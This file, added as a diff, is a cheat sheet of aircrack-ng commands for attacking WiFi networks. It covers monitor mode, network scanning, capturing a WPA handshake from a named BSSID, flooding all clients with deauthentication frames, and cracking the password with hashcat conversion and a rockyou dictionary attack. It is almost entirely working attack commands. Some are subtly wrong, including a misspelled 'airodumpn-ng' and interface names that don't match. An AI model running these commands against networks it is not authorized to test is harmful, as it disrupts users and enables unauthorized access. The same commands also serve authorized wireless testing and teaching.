@@ -1,0 +1,35 @@
+# Check wifi interface
+iwconfig
+
+# Kill conflicting processes
+sudo airmon-ng check kill
+
+# Start monitor mode
+sudo airmon-ng start wlan0
+
+# Stop monitor mode
+sudo airmon-ng stop wlan0
+
+# Check available networks (it will check 2.4ghz by default)
+sudo airodumpn-ng wlan0mon
+
+# For checking 5ghz networks
+sudo airodump-ng --band a wlan0mon
+
+# For checking 2.4ghz & 5ghz networks
+sudo airodump-ng --band abg wlan0mon
+
+# Capture handshake file
+sudo airodump-ng -w hack1 -c 1 --bssid EA:BC:20:1A:FB:EB wlan0
+
+# Deauth all the clients of an ap
+sudo aireplay-ng --deauth 0 -a EA:BC:20:1A:FB:EB wlan0
+
+# Check handshake in wireshark
+wireshark [captured.cap]
+
+# Convert pcap file to hc22000 format for hashcat
+hcxpcapngtool [input-file.cap] -o [output-file.hc22000]
+
+# Crack password with aircrack-ng dictionary attack
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
